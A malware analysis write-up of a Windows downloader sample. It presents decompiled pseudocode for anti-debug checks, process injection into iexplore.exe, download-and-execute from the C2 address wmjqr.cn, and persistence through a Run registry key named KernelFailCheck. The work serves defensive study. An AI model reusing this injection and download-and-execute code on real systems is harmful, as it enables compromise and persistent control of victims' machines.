# [Quick Note] Pseudo code sample dabddfe65db3b7525c5dedd1270669d4

# Overview

MD5: dabddfe65db3b7525c5dedd1270669d4 </br>
Threat miner: https://www.threatminer.org/sample.php?q=dabddfe65db3b7525c5dedd1270669d4#gsc.tab=0&gsc.q=dabddfe65db3b7525c5dedd1270669d4&gsc.page=1 </br>

Get information pe file from pestudio tools, this samples have a entropy values very low ```entropy: 1.392``` so this pe file not packed by packer but it's provide another information is self-modifying technique used on  ```.text``` section of sample </br> 

Self modifying code is code that modifies its own instructions during execution time. It is nowadays widely used, especially in malware to make the code hard to analyse and to detect by anti-viruses. </br>

# Start function
Begin of ```start``` function will checking virtual-key code and set ```debugbreak()``` if value on current keyboard not equals. </br>
If pass checking, function trigger call 2 sub functions are ```f_check_iexplore_and_create_process()``` , ``` f_open_process_and_create_thread((LPTHREAD_START_ROUTINE)StartAddress, v1)```. Set v1 is return values for first function and input param for second function. </br>
```
void start()
{
  [...]
  OutputDebugStringA(OutputString);             // Sends a string to the debugger for display.
  if ( VkKeyScanA(97) != 65 )                   // Translates a character to the corresponding virtual-key code and shift state for the current keyboard.
                                                // Compare virtual-key code A with A, if different execute debug break
    __debugbreak();                             // Causes a breakpoint exception to occur in the current process. This allows the calling thread to signal the debugger to handle the exception.
  v0 = GetModuleHandleA(0);
  GetModuleFileNameA(v0, FileName, 0x104u);
  v1 = f_check_iexplore_and_create_process();   // return process id of iexplore.exe
  f_open_process_and_create_thread((LPTHREAD_START_ROUTINE)StartAddress, v1);
  ExitProcess(0);
}
```

# First function f_check_iexplore_and_create_process
This function will using the Windows RegOpenKeyExA function to get data value of registry ```HKEY_CLASSES_ROOT\Applications\iexplore.exe\shell\open\command```. After that, using RegQueryValueA function to query data and  data of this registry is ```"C:\Program Files (x86)\Internet Explorer\iexplore.exe"``` </br>
After have an data, it use CreateProcessA function to create process for ```iexplore.exe``` and get process id of ```iexplore.exe```. </br>
```
DWORD f_check_iexplore_and_create_process()
{
  [...]  
  memset(&Data, 0, 0x104u);
  cbData = 260;
  if ( RegOpenKeyExA(HKEY_CLASSES_ROOT, SubKey, 0, 0xF003Fu, &phkResult) )// Open HKEY_CLASSES_ROOT\Applications\iexplore.exe\shell\open\command
    return 0;
  RegQueryValueA(phkResult, 0, &Data, &cbData); // Data - "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
  RegCloseKey(phkResult);
  result = lstrlenA(&Data);
  if ( result )
  {
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    ProcessInformation.hProcess = 0;
    ProcessInformation.hThread = 0;
    ProcessInformation.dwProcessId = 0;
    ProcessInformation.dwThreadId = 0;
    StartupInfo.cb = 68;
    CreateProcessA(0, &Data, 0, 0, 0, 4u, 0, 0, &StartupInfo, &ProcessInformation);// create process for iexplore.exe
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
    result = ProcessInformation.dwProcessId;    // get process id of iexplore.exe
  }
  return result;
}
```

# Second function f_open_process_and_create_thread
This function will execute two tasks. Firtly, call ```(LPTHREAD_START_ROUTINE)StartAddress``` and using process id (v1) to open prcess ```iexplore.exe```. </br>

# # 1. (LPTHREAD_START_ROUTINE)StartAddress
StartAddress functions loaded a few library dll used for this malware and execyte two sub functions are ```f_download_payload_from_C2``` and ```f_rename_file_and_set_regis``` </br>
```
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  LoadLibraryA(LibFileName);                    // "user32.dll"
  LoadLibraryA(aUrlmonDll_0);                   // "urlmon.dll"
  LoadLibraryA(aAdvapi32Dll_0);                 // "advapi32.dll"
  f_download_payload_from_C2(aHttpWmjqrCn0hx);  // "http://wmjqr.cn/0hx.txt"
  f_rename_file_and_set_regis();
  ExitProcess(0xFFFFFFFF);
}
```

With function ```f_download_payload_from_C2```, it's using URLDownloadToCacheFileA function to download file ```0hx.txt``` from C2 server ```http://wmjqr.cn/0hx.txt``` and use CreateFileA functions to create files because URLDownloadToCacheFileA function to return file name of cache location, need more step create file with data store into cache location. </br>
With ```URLDownloadToCacheFileA```: Downloads data to the Internet cache and returns the file name of the cache location for retrieving the bits. This function always returns a file name, if the download operation succeeds. URLDownloadToCacheFile downloads this file and returns the local file name of the cached copy. Use this function to ensure that a file name is returned without unnecessary copying of data. (With this funtion, it 
not depend too much on internet when downloading file but much more step to create files and create process for files) </br>
With ```URLDownloadToFile```: Downloads bits from the Internet and saves them to a file. (With this functions, it depend to much on internet when downloading file but after download success can create process for it and not more step create files) </br>
NOTED: this not compare advantage or disadvantage of two functions ```URLDownloadToCacheFileA``` and ```URLDownloadToFile```, it's explain deep knowledge when using two functions </br> 
```
char __cdecl f_download_payload_from_C2(LPCSTR a1)
{
  [....]
  v1 = 0;
  while ( URLDownloadToCacheFileA(0, a1, &FileName, 0x104u, 0, 0) )// Downloads data to the Internet cache and returns the file name of the cache location for retrieving the bits.
    Sleep(0x3E8u);
  v2 = CreateFileA(&FileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  v3 = v2;
  if ( v2 == (HANDLE)-1 )
    return 0;
  v5 = GetFileSize(v2, 0);
  hMem = LocalAlloc(0x40u, v5);
  NumberOfBytesRead = 0;
  ReadFile(v3, hMem, v5, &NumberOfBytesRead, 0);
  CloseHandle(v3);
  DeleteFileA(&FileName);
  if ( NumberOfBytesRead <= 0 )
    return 0;
  v6 = 0;
  memset(String, 0, sizeof(String));
  if ( v5 )
  {
    do
    {
      v7 = *((_BYTE *)hMem + v1);
      if ( v7 != 13 && v7 != 10 && v7 )
      {
        String[v6] = v7;
      }
      else
      {
        String[v6] = 0;
        v6 = -1;
        f_execute_command(String);
        Sleep(0x3E8u);
        memset(String, 0, sizeof(String));
      }
      ++v1;
      ++v6;
    }
    while ( v1 < v5 );
  }
  f_execute_command(String);
  LocalFree(hMem);
  return 1;
}
```

Into ```f_download_payload_from_C2``` function, it's trigger another sub funcions ```f_execute_command```. This function using the Windows WinExec function to execute command from malware. </br>
```
char __cdecl f_execute_command(LPCSTR lpString)
{
  [...]  
  if ( !lpString || !lstrlenA(lpString) )
    return 0;
  v1 = 10;
  do
  {
    if ( !URLDownloadToCacheFileA(0, lpString, &CmdLine, 0x104u, 0, 0) )
      break;
    Sleep(0x3E8u);
    --v1;
  }
  while ( v1 > 0 );
  if ( !v1 )
    return 0;
  WinExec(&CmdLine, 0);
  return 1;
}
```

With ```f_rename_file_and_set_regis``` function, this function get directory and rename this file after downloaded to ```syscheck.exe```, set new value name into registry ```HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run``` with name is ```KernelFailCheck``` and value of data is path store of malware ```syscheck.exe``` </br>
```
int f_rename_file_and_set_regis()
{
  [...]
  GetWindowsDirectoryA(&Buffer, 0x104u);
  wsprintfA(&NewFileName, aSSyscheckExe, &Buffer); // "%s\\syscheck.exe"
  CopyFileA(FileName, &NewFileName, 0);
  phkResult = 0;
  RegOpenKeyExA(HKEY_LOCAL_MACHINE, aSoftwareMicros, 0, 0x20006u, &phkResult);// HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
  v0 = lstrlenA(&NewFileName);
  RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)&NewFileName, v0 + 1);// Value name - KernelFailCheck
                                                // Data - path of malware
  RegCloseKey(phkResult);
  result = lstrcmpiA(FileName, &NewFileName);
  if ( result )
  {
    for ( result = DeleteFileA(FileName); !result; result = DeleteFileA(FileName) )
      Sleep(0x64u);
  }
  return result;
}
```

# # 2. f_open_process_and_create_thread((LPTHREAD_START_ROUTINE)StartAddress, v1)
After ```StartAddress``` function donwload payload from C2, created this data to new file ```syscheck.exe``` and created registry value for this. </br>
It's open process ```iexplore.exe``` and create new virtual space memory for new thread ```syscheck.exe```. This means ```syscheck.exe``` is children process of ```iexplore.exe```, it's call and started with  ```iexplore.exe``` </br>
```
int __stdcall f_open_process_and_create_thread(LPTHREAD_START_ROUTINE lpStartAddress, DWORD dwProcessId)
{
  [...]  
  v2 = GetModuleHandleA(0);
  v3 = v2;
  v14 = v2;
  v13 = 0;
  v4 = OpenProcess(0x1F0FFFu, 0, dwProcessId);
  v5 = v4;
  if ( v4 )
  {
    VirtualFreeEx(v4, v3, 0, 0x8000u);
    v6 = (char *)VirtualAllocEx(v5, v3, *(_DWORD *)((char *)v3 + v3[15] + 80), 0x3000u, 0x40u);
    v7 = v6;
    if ( v6 )
    {
      VirtualQueryEx(v5, v6, &Buffer, 0x1Cu);
      for ( i = BYTE1(Buffer.Protect); Buffer.Protect != 1; i = BYTE1(Buffer.Protect) )
      {
        v9 = Buffer.RegionSize;
        if ( !Buffer.RegionSize )
          break;
        if ( !(i & 1) )
        {
          v10 = 0;
          if ( Buffer.RegionSize )
          {
            v11 = v7;
            do
            {
              VirtualProtectEx(v5, v11, 0x1000u, 0x40u, &dwProcessId);
              WriteProcessMemory(v5, v11, v11, 0x1000u, &NumberOfBytesWritten);
              v10 += 4096;
              v11 += 4096;
              v9 = Buffer.RegionSize;
            }
            while ( v10 < Buffer.RegionSize );
            v3 = v14;
          }
        }
        v7 += v9;
        VirtualQueryEx(v5, v7, &Buffer, 0x1Cu);
      }
      if ( CreateRemoteThread(v5, 0, 0, lpStartAddress, v3, 0, &ThreadId) )
        v13 = 1;
    }
  }
  if ( dwProcessId )
    CloseHandle((HANDLE)dwProcessId);
  if ( v5 )
    CloseHandle(v5);
  return v13;
}
```

# Interesting string
New name registry set by malware: KernelFailCheck </br>
Registry key set by malware: Software\\Microsoft\\Windows\\CurrentVersion\\Run </br>
New name malware: %s\\syscheck.exe </br>
Registry iexplore: Applications\\iexplore.exe\\shell\\open\\command </br>
C2: http://wmjqr.cn/0hx.txt </br>
